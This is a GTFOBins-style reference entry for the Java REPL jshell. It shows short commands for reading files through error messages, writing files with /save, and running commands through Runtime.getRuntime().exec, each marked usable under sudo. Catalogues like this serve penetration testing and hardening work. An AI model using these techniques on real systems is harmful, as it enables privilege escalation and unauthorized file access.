---
type: gtfobin
name: jshell
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# jshell

## file-read

```bash
jshell
jshell> /open /path/to/input-file
```
_The content is leaked as error messages._
**Contexts:** sudo, unprivileged

## file-write

```bash
jshell
String x = "DATA";
/save /path/to/output-file
```
_Writes only the valid Java code to file._
**Contexts:** sudo, unprivileged

## shell

```bash
jshell
Runtime.getRuntime().exec("/path/to/command");
```
**Contexts:** sudo, unprivileged
